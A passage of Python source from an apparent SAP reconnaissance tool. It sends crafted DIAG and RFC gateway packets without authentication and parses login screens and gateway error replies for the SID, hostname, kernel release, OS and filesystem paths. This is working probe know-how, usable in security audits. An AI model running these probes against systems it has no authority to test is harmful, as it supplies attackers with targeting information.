      - hostname: srv03s4d1
      - SID: S4D
      - instance: 01
      - work process: W9

    The text may be ASCII or UTF-16LE (depending on codepage negotiation).
    """
    if not error_data or len(error_data) < 4:
        return

    # Detect UTF-16LE: if data has alternating byte-null pattern
    # (e.g., 'i\x00n\x00v\x00...'), decode as UTF-16LE
    # Check first 6 bytes for the pattern (3 chars)
    raw = error_data.rstrip(b'\x0c')
    is_utf16 = (len(raw) >= 6
                and raw[1] == 0 and raw[3] == 0 and raw[5] == 0
                and raw[0] != 0 and raw[2] != 0 and raw[4] != 0)

    if is_utf16:
        # Ensure even length
        if len(raw) % 2 != 0:
            raw += b'\x00'
        text = raw.decode('utf-16-le', errors='replace').rstrip('\x00')
    else:
        text = raw.rstrip(b'\x00').decode('ascii', errors='replace')

    text = text.strip()
    if not text:
        return

    info['diag_error_text'] = text

    # Parse "location <hostname>_<SID>_<instance>-<wpid>" pattern
    m = re.search(
        r'location\s+(\S+?)_([A-Z][A-Z0-9]{2})_(\d{2})(?:-(\w+))?',
        text, re.IGNORECASE)
    if m:
        info['hostname'] = m.group(1)
        info['RFCSYSID'] = m.group(2).upper()
        info['sap_sid'] = m.group(2).upper()
        info['instance_number'] = m.group(3)
        if m.group(4):
            info['diag_work_process'] = m.group(4)


def _parse_diag_items(items_data, info):
    """
    Parse SAPDiagItem list from uncompressed DIAG message data.

    Item format for APPL (0x10):
      [1B type] [1B id] [1B sid] [2B length] [NB value]

    Item format for APPL4 (0x12):
      [1B type] [1B id] [1B sid] [4B length] [NB value]

    Other item types (SES=0x01, EOM=0x0c, etc.) have only type + value.
    """
    pos = 0
    while pos < len(items_data):
        if pos + 1 > len(items_data):
            break

        item_type = items_data[pos]

        if item_type == 0x0c:  # EOM (End of Message)
            break

        if item_type in (0x10, 0x12):  # APPL or APPL4
            if item_type == 0x10:
                # APPL: type(1) + id(1) + sid(1) + length(2)
                if pos + 5 > len(items_data):
                    break
                item_id = items_data[pos + 1]
                item_sid = items_data[pos + 2]
                item_len = struct.unpack('>H', items_data[pos + 3:pos + 5])[0]
                header_size = 5
            else:
                # APPL4: type(1) + id(1) + sid(1) + length(4)
                if pos + 7 > len(items_data):
                    break
                item_id = items_data[pos + 1]
                item_sid = items_data[pos + 2]
                item_len = struct.unpack('>I', items_data[pos + 3:pos + 7])[0]
                header_size = 7

            value_start = pos + header_size
            value_end = value_start + item_len

            if value_end > len(items_data):
                # Truncated item - try to use what we have
                item_value = items_data[value_start:]
                pos = len(items_data)
            else:
                item_value = items_data[value_start:value_end]
                pos = value_end

            # Extract ST_R3INFO fields
            if item_id == 0x06:  # ST_R3INFO
                field_name = _DIAG_R3INFO_SIDS.get(item_sid)
                if field_name:
                    try:
                        text = item_value.rstrip(b'\x00').decode(
                            'utf-8', errors='replace')
                        if field_name == 'KERNEL_VERSION':
                            # Null-separated components: "793\x00200\x00..."
                            parts = text.split('\x00')
                            parts = [p.strip() for p in parts if p.strip()]
                            info['diag_kernel_version'] = '.'.join(parts)
                            if parts:
                                info['kernel_release'] = parts[0]
                        elif field_name == 'DBNAME':
                            info['RFCSYSID'] = text.strip()
                            info['sap_sid'] = text.strip()
                        elif field_name == 'CPUNAME':
                            info['hostname'] = text.strip()
                        elif field_name == 'CLIENT':
                            info['diag_client'] = text.strip()
                        elif field_name == 'CODEPAGE':
                            codepage_val = text.strip()
                            if codepage_val:
                                info['diag_codepage'] = codepage_val
                        elif field_name == 'DYNPRONAME':
                            info['diag_dynpro_name'] = text.strip()
                        elif field_name == 'DYNPRONUMBER':
                            info['diag_dynpro_number'] = text.strip()
                        elif field_name == 'MESSAGE':
                            msg = text.strip()
                            if msg:
                                info.setdefault('diag_messages', []).append(msg)
                    except Exception:
                        pass

            # Extract DYNT items for screen field text
            elif item_id == 0x09:  # DYNT
                _parse_dynt_atoms(item_value, info)

        elif item_type in (0x01, 0x02, 0x03, 0x07, 0x08, 0x09,
                           0x0a, 0x0b, 0x11, 0x13, 0x15):
            # Non-APPL items: variable-length, hard to parse without
            # knowing the exact format. Skip by scanning for next valid
            # item_type byte. This is a best-effort approach.
            pos += 1
            # Skip until we find another known item type or EOM
            while pos < len(items_data):
                b = items_data[pos]
                if b in (0x10, 0x12, 0x0c):  # APPL, APPL4, or EOM
                    break
                pos += 1
        else:
            pos += 1


def _parse_dynt_atoms(data, info):
    """
    Parse DYNT_ATOM structures for login screen text content.

    DYNT atoms contain the actual text displayed on the login screen,
    including the session title which typically contains the SID.
    This is a best-effort text extraction.
    """
    # DYNT atoms contain screen field data. Extract printable strings
    # that might contain useful system information.
    try:
        # Look for printable text runs in the DYNT data
        text_runs = []
        current = b''
        for byte in data:
            if 0x20 <= byte < 0x7f:
                current += bytes([byte])
            else:
                if len(current) >= 4:
                    text_runs.append(current.decode('ascii', errors='replace'))
                current = b''
        if len(current) >= 4:
            text_runs.append(current.decode('ascii', errors='replace'))

        for text in text_runs:
            # Session title often contains SID
            if 'SAP' in text and not info.get('diag_session_title'):
                info['diag_session_title'] = text.strip()
    except Exception:
        pass


def _scan_diag_raw(data, info):
    """
    Fallback: scan raw (possibly compressed) DIAG response for known patterns.

    When the response is compressed and we can't decompress LZC/LZH,
    scan for readable ASCII strings that match known SAP patterns.
    """
    # Many SAP systems embed the SID and hostname in readable form
    # even in compressed responses, because short strings often
    # survive compression intact or appear in uncompressed metadata.

    # Look for APPL items that might be partially visible
    for i in range(len(data) - 5):
        if data[i] == 0x10 and data[i + 1] == 0x06:  # APPL + ST_R3INFO
            item_sid = data[i + 2]
            if i + 5 <= len(data):
                item_len = struct.unpack('>H', data[i + 3:i + 5])[0]
                if 0 < item_len < 256 and i + 5 + item_len <= len(data):
                    value = data[i + 5:i + 5 + item_len]
                    field_name = _DIAG_R3INFO_SIDS.get(item_sid)
                    if field_name:
                        try:
                            text = value.rstrip(b'\x00').decode(
                                'utf-8', errors='replace').strip()
                            if text and all(c.isprintable() or c == '\x00'
                                            for c in text):
                                if field_name == 'DBNAME':
                                    info['RFCSYSID'] = text
                                    info['sap_sid'] = text
                                elif field_name == 'CPUNAME':
                                    info['hostname'] = text
                                elif field_name == 'CLIENT':
                                    info['diag_client'] = text
                                elif field_name == 'KERNEL_VERSION':
                                    parts = text.split('\x00')
                                    parts = [p.strip() for p in parts
                                             if p.strip()]
                                    if parts:
                                        info['kernel_release'] = parts[0]
                        except Exception:
                            pass


def probe_diag_login(target, port, timeout=10, verbose=False, router=None):
    """
    Probe a SAP system via the DIAG protocol (port 32XX) to extract
    system information from the login screen.

    Sends a TERM_INI initialization packet and parses the login screen
    response for SID, hostname, client number, and kernel version.

    Args:
        target: Target IP address
        port: DIAG port (typically 32XX where XX = instance number)
        timeout: Connection timeout in seconds
        verbose: Print protocol-level debug output
        router: Optional (host, port) tuple for SAProuter

    Returns:
        dict with extracted information, or empty dict on failure
    """
    result = {}

    if verbose:
        print('[4] DIAG login screen extraction...')

    try:
        if router:
            sock = connect_via_saprouter(
                router[0], router[1], target, port, timeout, verbose)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))

        # Send TERM_INI
        pkt = build_diag_term_ini()
        if verbose:
            print(f'    Sending TERM_INI ({len(pkt)} bytes)...')
        sock.sendall(pkt)

        # Receive response - login screen can be large
        response = b''
        recv_start = time.time()
        try:
            while time.time() - recv_start < timeout:
                remaining = max(1, timeout - (time.time() - recv_start))
                sock.settimeout(remaining)
                chunk = sock.recv(16384)
                if not chunk:
                    break
                response += chunk

                # Check if we have a complete NI frame
                if len(response) >= 4:
                    ni_len = struct.unpack('>I', response[:4])[0]
                    if ni_len > 0 and len(response) >= 4 + ni_len:
                        break
        except socket.timeout:
            pass

        if verbose:
            print(f'    Received {len(response)} bytes')

        if len(response) > 12:
            result = parse_diag_response(response)
            if verbose:
                if result:
                    resp_type = ('login screen' if len(response) > 212
                                 else 'error response')
                    print(f'    Parsed {resp_type}:')
                    for k, v in result.items():
                        if not k.startswith('_'):
                            print(f'      {k}: {v}')
                else:
                    print('    Could not parse response')
        elif verbose:
            print(f'    Response too short ({len(response)} bytes)')

    except socket.timeout:
        if verbose:
            print('    Connection timed out')
    except ConnectionRefusedError:
        if verbose:
            print('    Connection refused')
    except ConnectionResetError:
        if verbose:
            print('    Connection reset')
    except OSError as e:
        if verbose:
            print(f'    Error: {e}')
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return result


# ============================================================================
# Response Parsers
# ============================================================================

def parse_rfcsi_response(data):
    """
    Parse the RFC_SYSTEM_INFO response and extract RFCSI_EXPORT fields.

    Response framing (from pcap):
      - 6 null bytes (two empty NI keepalive frames)
      - 4-byte NI length header
      - APPC response (version 6, type 0xCB)
      - RFC TLV items with parameter values
      - RFCSI_EXPORT: 245 chars in UTF-16LE = 490 bytes
    """
    result = {}
    if len(data) < 20:
        return result

    # Find RFCPROTO "011" in UTF-16LE (marker for RFCSI_EXPORT start)
    proto_marker = '011'.encode('utf-16-le')
    proto_pos = data.find(proto_marker)

    if proto_pos < 0:
        # Check for any recognizable SAP content
        for marker in ['HDB', 'ORA', 'MSS', 'ADA', 'DB6',
                       'Linux', 'Windows', 'AIX', 'HP-UX', 'SunOS']:
            if data.find(marker.encode('utf-16-le')) >= 0:
                result['_partial'] = True
                break
        return result

    # Decode all 20 RFCSI_EXPORT fields
    rfcsi_data = data[proto_pos:proto_pos + RFCSI_TOTAL_CHARS * 2]
    if len(rfcsi_data) < RFCSI_TOTAL_CHARS * 2:
        result['_truncated'] = True

    pos = 0
    for field_name, field_len in RFCSI_FIELDS:
        byte_len = field_len * 2
        if pos + byte_len > len(rfcsi_data):
            break
        raw = rfcsi_data[pos:pos + byte_len]
        try:
            value = raw.decode('utf-16-le').rstrip('\x00').strip()
        except UnicodeDecodeError:
            value = raw.hex()
        if value:
            result[field_name] = value
        pos += byte_len

    return result


def parse_appc_rc(data):
    """
    Parse APPC/SAP return codes from gateway response.
    Returns dict with appc_rc, sap_rc, and conv_id if present.
    """
    info = {}
    if len(data) < 4:
        return info

    # Skip NI frame header
    payload = data
    if len(data) >= 4:
        ni_len = struct.unpack('>I', data[:4])[0]
        if ni_len > 0 and 4 + ni_len <= len(data):
            payload = data[4:4 + ni_len]

    if len(payload) < 12:
        return info

    # Version and function type
    info['version'] = payload[0]
    info['func_type'] = payload[1]

    # APPC_RC at offset 6-7 (big-endian uint16)
    appc_rc = struct.unpack('>H', payload[6:8])[0]
    info['appc_rc'] = appc_rc

    # SAP_RC at offset 8-11 (big-endian uint32)
    sap_rc = struct.unpack('>I', payload[8:12])[0]
    info['sap_rc'] = sap_rc

    # Conversation ID at offset 12-15 (big-endian uint32)
    if len(payload) >= 16:
        conv_id = struct.unpack('>I', payload[12:16])[0]
        info['conv_id'] = conv_id

    # Also try to find 8-digit ASCII conv_id (chipik method)
    ascii_match = re.search(rb'(\d{8})', payload[12:60])
    if ascii_match:
        info['conv_id_ascii'] = ascii_match.group(1).decode('ascii')

    return info


def parse_gateway_error(data):
    """
    Parse gateway error responses for leaked system information.

    Even failed RFC connections reveal hostname, kernel version, OS, source
    file paths, timestamps, and gateway identity in *ERR* blocks.

    Error response format: null-terminated ASCII strings starting from *ERR*
    marker, containing structured error info from gwr3cpic.c or similar
    gateway source modules.
    """
    info = {}
    err_start = data.find(b'*ERR*')
    if err_start == -1:
        return info

    # Extract null-terminated ASCII strings from error area
    strings = []
    current = b''
    for i in range(err_start, len(data)):
        if data[i] == 0:
            if current:
                try:
                    strings.append(current.decode('ascii'))
                except Exception:
                    pass
                current = b''
        elif 0x20 <= data[i] < 0x7f:
            current += bytes([data[i]])
        else:
            if current:
                try:
                    strings.append(current.decode('ascii'))
                except Exception:
                    pass
                current = b''

    # Parse structured error fields using positional context
    #
    # SAP Gateway error format (null-terminated strings):
    #   *ERR* | severity | error_message | error_code | component |
    #   kernel_release | severity2 | source_file | source_line |
    #   timestamp | ??? | "SAP-Gateway on host X / sapgwNN" | *ERR*
    #
    # The kernel release always comes immediately after "SAP-Gateway"
    # component string. The error_code before it can look like a kernel
    # number (e.g. 728) but is NOT the kernel.

    saw_component = False
    for i, s in enumerate(strings):
        if s == '*ERR*':
            saw_component = False
            continue

        # Source path: contains kernel release and OS hint
        # Examples:
        #   D:/depot/bas/742_REL/src/krn/si/gw/gwntrd.c  (Windows)
        #   /bas/793_REL/src/krn/si/gw/gwr3cpic.c        (Linux/Unix)
        #   gwxxrd.c (truncated - no path, no OS detection)
        if ('depot/bas/' in s or '/bas/' in s or '\\bas\\' in s or
                '/krn/' in s or '\\krn\\' in s):
            info['source_path'] = s
            ver = re.search(r'(\d{3})_REL', s)
            if ver:
                info['kernel_release'] = ver.group(1)

            # OS detection: check Windows drive letter FIRST, then Unix path
            if re.match(r'^[A-Z]:[/\\]', s):
                info['os_hint'] = 'Windows'
            elif '\\' in s:
                info['os_hint'] = 'Windows'
            elif s.startswith('/'):
                info['os_hint'] = 'Linux/Unix'
        elif re.match(r'^gw\w+\.(c|h)$', s):
            # Truncated source filename (no path prefix)
            info['source_file'] = s

        # SAP filesystem path: e.g. E:\usr\sap\WAS\DVEBMGS00\data\sideinfo.DAT
        # or /usr/sap/S4H/DVEBMGS00/data/sideinfo.DAT
        # Reveals: OS, SID, instance profile
        sap_path = re.match(
            r'^([A-Z]:\\|/)(usr[/\\]sap[/\\])(\w+)[/\\](\w+)[/\\]', s)
        if sap_path:
            info['sap_filesystem_path'] = s
            drive_or_root = sap_path.group(1)
            sid = sap_path.group(3)
            instance_profile = sap_path.group(4)

            if drive_or_root.endswith('\\'):
                info['os_hint'] = 'Windows'
            else:
                info['os_hint'] = 'Linux/Unix'

            if 'sap_sid' not in info:
                info['sap_sid'] = sid
            if 'instance_profile' not in info:
                info['instance_profile'] = instance_profile
                # Extract instance number from profile name
                # DVEBMGS00 -> 00, D00 -> 00, ASCS01 -> 01
                inst_match = re.search(r'(\d{2})$', instance_profile)
                if inst_match and 'instance_number' not in info:
                    info['instance_number'] = inst_match.group(1)
        # Also check for bare Windows paths with backslashes
        elif '\\' in s and re.match(r'^[A-Z]:\\', s):
            if 'os_hint' not in info:
                info['os_hint'] = 'Windows'

        # Error message text (various patterns)
        if (len(s) > 10 and not s.startswith('*') and
                any(kw in s for kw in ['Start of', 'not found',
                                        'failed', 'missing', 'error'])):
            if 'error_message' not in info:
                info['error_message'] = s

        # SAP-Gateway or SAP-GW-LIB component string - marks that next
        # 3-digit number is the kernel release
        if re.match(r'^SAP-G(ateway|W-LIB)', s) and 'on host' not in s:
            info['component'] = s
            saw_component = True
            continue

        # Kernel release: 3-digit number immediately after component string
        # (positional parsing)
        if saw_component and re.match(r'^\d{3}$', s):
            info['kernel_release'] = s
            saw_component = False
            continue
        else:
            saw_component = False

        # Server timestamp (e.g. "Mon Feb 23 22:39:29 2026")
        if re.match(r'^(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s', s):
            info['server_timestamp'] = s

        # Gateway host identification
        # "SAP-Gateway on host WINWAS740 / sapgw40"
        m = re.match(r'SAP-Gateway on host (\S+)\s*/\s*(\S+)', s)
        if m:
            info['hostname'] = m.group(1)
            info['gateway_name'] = m.group(2)
            inst = re.search(r'sapgw(\d+)', m.group(2))
            if inst:
                if 'instance_number' not in info:
                    info['instance_number'] = inst.group(1)

        # Gateway function/module name
        if re.match(r'^Gw\w+$', s):
            info['gw_function'] = s

        # TP specification error (also leaks system identity)
        if 'missing tp specification' in s.lower():
            info['error_message'] = s

    return info


# ============================================================================
# Main Probe Function
# ============================================================================

def _enrich_kernel_release(result, kr):
    """
    Enrich result dict with SAP release info inferred from kernel release.

    The SAP kernel release is tightly coupled to the SAP Basis release,
    but a system can run a NEWER kernel than its Basis release (forward
    compatibility). For example, kernel 742 can run Basis 7.40-7.42.
    """
    KERNEL_RELEASE_MAP = {
        '700': ('700',     '7.00-7.02', 'NW 7.0x'),
        '701': ('700-701', '7.00-7.01', 'NW 7.0x'),
        '710': ('710',     '7.10',      'NW 7.10'),
        '720': ('720',     '7.20',      'NW 7.20'),
        '721': ('720-721', '7.20-7.21', 'NW 7.2x'),
        '740': ('740',     '7.40',      'NW 7.40'),
        '741': ('740-741', '7.40-7.41', 'NW 7.4x'),
        '742': ('740-742', '7.40-7.42', 'NW 7.4x'),
        '745': ('740-745', '7.40-7.45', 'NW 7.4x'),
        '749': ('749-750', '7.49-7.50', 'NW 7.50 / S/4HANA 1511'),
        '753': ('750-753', '7.50-7.53', 'S/4HANA 1709/1809'),
        '754': ('750-754', '7.50-7.54', 'S/4HANA 1909'),
        '755': ('750-755', '7.50-7.55', 'S/4HANA 2020'),
        '756': ('750-756', '7.50-7.56', 'S/4HANA 2021'),
        '757': ('750-757', '7.50-7.57', 'S/4HANA 2022'),
        '777': ('750-757', '7.50-7.57', 'S/4HANA 2020-2022'),
        '785': ('750-758', '7.50-7.58', 'S/4HANA Cloud/2023'),
        '789': ('750-758', '7.50-7.58', 'S/4HANA 2022/2023'),
        '791': ('750-758', '7.50-7.58', 'S/4HANA Cloud/2023'),
        '793': ('750-758', '7.50-7.58', 'S/4HANA 2022/2023'),
    }
    entry = KERNEL_RELEASE_MAP.get(kr)
    if entry:
        rel_code, rel_display, product = entry
        result['sap_release_range'] = rel_code
        result['sap_release_approx'] = rel_display
        result['sap_product'] = product


def _detect_port_type(port):
    """
    Detect SAP service type from port number.

    Returns:
        'diag' for DIAG ports (32XX)
        'gateway' for RFC Gateway ports (33XX)
        'unknown' for other ports
    """
    if 3200 <= port <= 3299:
        return 'diag'
    elif 3300 <= port <= 3399:
        return 'gateway'
    else:
        return 'unknown'


def probe_sap_system(target, port, timeout=10, verbose=False, router=None):
    """
    Probe a SAP system for system information without authentication.

    Automatically detects the port type and uses appropriate methods:
      - DIAG ports (32XX): Login screen extraction via DIAG protocol
      - Gateway ports (33XX): RFC_SYSTEM_INFO via RFC/Gateway protocol
      - Other ports: Tries all methods

    RFC/Gateway methods (port 33XX):
      1. V6 single-packet RFC call (pcap template replay)
      2. V2 GW_NORMAL_CLIENT + F_SAP_INIT error leak
      3. Chipik-style F_SAP_INIT (ctype=E, sapxpg, T_75)

    DIAG method (port 32XX):
      4. DIAG TERM_INI login screen extraction

    Args:
        target: Target IP address or hostname
        port: Target port number
        timeout: Connection timeout in seconds
        verbose: Print protocol-level debug output
        router: Optional (host, port) tuple for SAProuter

    Returns dict with all extracted information merged.
    """
    result = {
        'target': target,
        'port': port,
        'status': 'unknown',
        'methods_tried': [],
        'methods_success': [],
    }
    local_ip = get_local_ip(router[0] if router else target)
    instance = port % 100
    port_type = _detect_port_type(port)

    if verbose:
        print(f'[*] Local IP: {local_ip}')
        print(f'[*] Target: {target}:{port} (instance {instance:02d})')
        if router:
            print(f'[*] Via SAProuter: {router[0]}:{router[1]}')
        print(f'[*] Port type: {port_type}')
        print(f'[*] Hostname: {socket.gethostname()}')
        print()

    # ---- Method 4: DIAG login screen (for 32XX ports) ----
    if port_type in ('diag', 'unknown'):
        result['methods_tried'].append('diag_login')

        diag_info = probe_diag_login(target, port, timeout, verbose, router)
        if diag_info and (diag_info.get('RFCSYSID') or diag_info.get('hostname')
                          or diag_info.get('kernel_release')):
            result['status'] = 'diag_success'
            result['methods_success'].append('diag_login')
            result.update(diag_info)

            if verbose:
                print('    SUCCESS - extracted login screen info!')

        if port_type == 'diag':
            # For DIAG ports, skip RFC methods (they won't work)
            # Go straight to enrichment
            kr = result.get('RFCKERNRL') or result.get('kernel_release')
            if kr:
                _enrich_kernel_release(result, kr)
            return result

        if verbose:
            print()

    # ---- Method 1: V6 single-packet RFC call ----
    if verbose:
        print('[1] V6 GW_NORMAL_CLIENT single-packet RFC call...')

    result['methods_tried'].append('v6_single_packet')

    try:
        if router:
            sock = connect_via_saprouter(
                router[0], router[1], target, port, timeout, verbose)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
        result['status'] = 'tcp_open'

        request = build_rfc_system_info_request(local_ip, target, instance)
        if verbose:
            print(f'    Sending {len(request)} bytes...')

        sock.sendall(request)

        # Receive response
        response = b''
        recv_start = time.time()
        try:
            while time.time() - recv_start < timeout:
                remaining = max(1, timeout - (time.time() - recv_start))
                sock.settimeout(remaining)
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response += chunk

                # Check for complete NI frame
                if len(response) >= 10:
                    scan = 0
                    fl = 0
                    while scan < len(response) - 4:
                        fl = struct.unpack('>I', response[scan:scan+4])[0]
                        if fl == 0:
                            scan += 4
                            continue
                        if scan + 4 + fl <= len(response):
                            break
                        break
                    if fl > 0 and scan + 4 + fl <= len(response):
                        break
        except socket.timeout:
            pass

        if verbose:
            print(f'    Received {len(response)} bytes')

        if len(response) > 20:
            rfcsi = parse_rfcsi_response(response)
            if rfcsi and not rfcsi.get('_partial') and not rfcsi.get('_truncated'):
                result['status'] = 'rfc_success'
                result['methods_success'].append('v6_single_packet')
                result.update(rfcsi)
                if verbose:
                    print('    SUCCESS - got RFCSI_EXPORT!')
                    for k, v in rfcsi.items():
                        if not k.startswith('_'):
                            print(f'      {k}: {v}')
                return result
            else:
                err = parse_gateway_error(response)
                if err:
                    result['status'] = 'partial_info'
                    result['methods_success'].append('v6_error_leak')
                    result.update(err)
                    if verbose:
                        print('    Error response with system info:')
                        for k, v in err.items():
                            print(f'      {k}: {v}')
                elif verbose:
                    print('    No RFCSI_EXPORT in response')
        elif verbose:
            print(f'    No meaningful response ({len(response)} bytes)')

    except socket.timeout:
        if verbose:
            print('    Connection timed out')
    except ConnectionRefusedError:
        result['status'] = 'refused'
        result['error'] = 'Connection refused'
        return result
    except ConnectionResetError:
        if verbose:
            print('    Connection reset')
    except OSError as e:
        if verbose:
            print(f'    Error: {e}')
    finally:
        try:
            sock.close()
        except Exception:
            pass

    # ---- Method 2: V2 GW_NORMAL_CLIENT + F_SAP_INIT ----
    if result['status'] != 'rfc_success':
        if verbose:
            print('\n[2] V2 GW_NORMAL_CLIENT + F_SAP_INIT error leak...')

        result['methods_tried'].append('v2_error_leak')

        try:
            if router:
                sock2 = connect_via_saprouter(
                    router[0], router[1], target, port, timeout, verbose)
            else:
                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock2.settimeout(timeout)
                sock2.connect((target, port))

            # P1: Gateway handshake
            pkt1 = build_gw_normal_client_v2(local_ip, instance)
            if verbose:
                print(f'    P1: GW_NORMAL_CLIENT v2 ({len(pkt1)} bytes)...')
            sock2.sendall(pkt1)
            resp1 = sock2.recv(8192)
            if verbose:
                print(f'    P1 response: {len(resp1)} bytes')

            if len(resp1) >= 64:
                result['status'] = 'gateway_alive'
                p = resp1[4:]  # Skip NI header
                if len(p) >= 20:
                    result['gw_service'] = p[10:20].split(b'\x00')[0].decode('ascii', errors='replace')
                if len(p) >= 24:
                    result['gw_codepage'] = p[20:24].decode('ascii', errors='replace')
                if verbose:
                    print(f'    Gateway alive: {result.get("gw_service")}')

                # P2: F_SAP_INIT probe
                pkt2 = build_f_sap_init_v2(local_ip, target, instance)
                if verbose:
                    print(f'    P2: F_SAP_INIT probe ({len(pkt2)} bytes)...')
                sock2.sendall(pkt2)
                resp2 = ni_recv(sock2, timeout=min(timeout, 1))
                if verbose:
                    print(f'    P2 response: {len(resp2)} bytes')

                # Parse APPC return codes
                appc = parse_appc_rc(resp2)
                if verbose and appc:
                    print(f'    APPC_RC={appc.get("appc_rc")}, '
                          f'SAP_RC={appc.get("sap_rc")}, '
                          f'conv_id={appc.get("conv_id")}')

                # Parse error text
                err = parse_gateway_error(resp2)
                if err:
                    result['methods_success'].append('v2_error_leak')
                    result['status'] = 'info_extracted'
                    result.update(err)
                    if verbose:
                        for k, v in err.items():
                            print(f'      {k}: {v}')
                elif verbose:
                    print('    No error text in response')

        except socket.timeout:
            if verbose:
                print('    Timed out')
            if result['status'] == 'unknown':
                result['status'] = 'timeout'
        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
            if verbose:
                print(f'    Error: {e}')
            if result['status'] == 'unknown':
                result['status'] = 'error'
                result['error'] = str(e)
        finally:
            try:
                sock2.close()
            except Exception:
                pass

    # ---- Method 3: Chipik-style F_SAP_INIT (+P3 follow-up) ----
    # Try this even if method 2 succeeded - may get different/additional info
    if result['status'] != 'rfc_success':
        if verbose:
            print('\n[3] Chipik-style F_SAP_INIT (ctype=E, sapxpg, T_75)...')

        result['methods_tried'].append('chipik_p2')

        try:
            if router:
                sock3 = connect_via_saprouter(
                    router[0], router[1], target, port, timeout, verbose)
            else:
                sock3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock3.settimeout(timeout)
                sock3.connect((target, port))

            # P1: Gateway handshake (same as method 2)
            pkt1 = build_gw_normal_client_v2(local_ip, instance)
            if verbose:
                print(f'    P1: GW_NORMAL_CLIENT v2 ({len(pkt1)} bytes)...')
            sock3.sendall(pkt1)
            resp1 = sock3.recv(8192)
            if verbose:
                print(f'    P1 response: {len(resp1)} bytes')

            if len(resp1) >= 64:
                # P2: Chipik-style F_SAP_INIT
                pkt2 = build_chipik_p2(local_ip, target, instance)
                if verbose:
                    print(f'    P2: Chipik F_SAP_INIT ({len(pkt2)} bytes)...')
                sock3.sendall(pkt2)
                resp2 = ni_recv(sock3, timeout=min(timeout, 5))

                if verbose:
                    print(f'    P2 response: {len(resp2)} bytes')

                # Parse APPC return codes
                appc = parse_appc_rc(resp2)
                if verbose and appc:
                    print(f'    APPC_RC={appc.get("appc_rc")}, '
                          f'SAP_RC={appc.get("sap_rc")}, '
                          f'conv_id={appc.get("conv_id")}')

                # Parse error text for system info
                err = parse_gateway_error(resp2)
                if err:
                    result['methods_success'].append('chipik_p2')
                    if result['status'] not in ('info_extracted',):
                        result['status'] = 'info_extracted'
                    # Merge: don't overwrite existing values with empty ones
                    for k, v in err.items():
                        if k not in result or not result[k]:
                            result[k] = v
                    if verbose:
                        for k, v in err.items():
                            print(f'      {k}: {v}')

                # P3 follow-up: if P2 returned APPC_RC=0 with a conv_id,
                # try F_SAP_SEND - even a failed RFC call leaks system info
                conv_id_ascii = appc.get('conv_id_ascii')
                if appc.get('appc_rc') == 0 and conv_id_ascii and not err:
                    if verbose:
                        print(f'    P2 accepted (conv_id={conv_id_ascii}), '
                              f'sending P3 F_SAP_SEND...')

                    result['methods_tried'].append('chipik_p3')
                    pkt3 = build_f_sap_send_rfc(conv_id_ascii)
                    if verbose:
                        print(f'    P3: F_SAP_SEND RFC_SYSTEM_INFO '
                              f'({len(pkt3)} bytes)...')
                    sock3.sendall(pkt3)
                    resp3 = ni_recv(sock3, timeout=min(timeout, 5))

                    if verbose:
                        print(f'    P3 response: {len(resp3)} bytes')

                    if len(resp3) > 20:
                        # First check for full RFCSI_EXPORT success
                        rfcsi = parse_rfcsi_response(resp3)
                        if (rfcsi and not rfcsi.get('_partial')
                                and not rfcsi.get('_truncated')):
                            result['status'] = 'rfc_success'
                            result['methods_success'].append('chipik_p3')
                            result.update(rfcsi)
                            if verbose:
                                print('    SUCCESS - got RFCSI_EXPORT!')
                                for k, v in rfcsi.items():
                                    if not k.startswith('_'):
                                        print(f'      {k}: {v}')
                        else:
                            # Parse error text from P3 response
                            err3 = parse_gateway_error(resp3)
                            if err3:
                                result['methods_success'].append('chipik_p3')
                                if result['status'] not in ('info_extracted',):
                                    result['status'] = 'info_extracted'
                                for k, v in err3.items():
                                    if k not in result or not result[k]:
                                        result[k] = v
                                if verbose:
                                    print('    P3 error response with info:')
                                    for k, v in err3.items():
                                        print(f'      {k}: {v}')
                            elif verbose:
                                appc3 = parse_appc_rc(resp3)
                                print(f'    P3 APPC_RC='
                                      f'{appc3.get("appc_rc")}, '
                                      f'SAP_RC={appc3.get("sap_rc")}')

                elif not err and verbose:
                    # Even without error text, APPC codes tell us something
                    if appc.get('appc_rc') == 20:
                        print('    Gateway rejected (ACL/secinfo), no error text')
                    elif appc.get('appc_rc') == 1:
                        print('    APPC allocation error, no error text')
                    elif appc.get('appc_rc') == 0 and not conv_id_ascii:
                        print('    APPC_RC=0 but no conv_id found')
                    else:
                        print('    No error text in response')

                # P3b: Reinit probe - send a second F_SAP_INIT on the same
                # connection to trigger gwxxside.c / ReadSideInfo error.
                # This reveals the full filesystem path including OS drive
                # letter, SAP SID, and instance profile name.
                # Only needed when we don't have os_hint yet.
                if (appc.get('appc_rc') in (0, 19)
                        and 'os_hint' not in result):
                    if verbose:
                        print('\n    P3b: Reinit probe for sideinfo path...')

                    result['methods_tried'].append('reinit_probe')
                    pkt3b = build_f_sap_init_reinit(
                        local_ip, target, instance)
                    if verbose:
                        print(f'    P3b: F_SAP_INIT reinit '
                              f'({len(pkt3b)} bytes)...')

                    try:
                        sock3.sendall(pkt3b)
                        resp3b = ni_recv(sock3, timeout=min(timeout, 5))

                        if verbose:
                            print(f'    P3b response: {len(resp3b)} bytes')

                        if len(resp3b) > 20:
                            err3b = parse_gateway_error(resp3b)
                            if err3b:
                                result['methods_success'].append(
                                    'reinit_probe')
                                if result['status'] not in (
                                        'info_extracted',):
                                    result['status'] = 'info_extracted'
                                for k, v in err3b.items():
                                    if k not in result or not result[k]:
                                        result[k] = v
                                if verbose:
                                    print('    P3b sideinfo leak:')
                                    for k, v in err3b.items():
                                        print(f'      {k}: {v}')
                            elif verbose:
                                print('    P3b: no error text')
                    except (socket.timeout, OSError) as e:
                        if verbose:
                            print(f'    P3b error: {e}')

        except socket.timeout:
            if verbose:
                print('    Timed out')
        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
            if verbose:
                print(f'    Error: {e}')
        finally:
            try:
                sock3.close()
            except Exception:
                pass

    # ---- Enrichment ----
    kr = result.get('RFCKERNRL') or result.get('kernel_release')
    if kr:
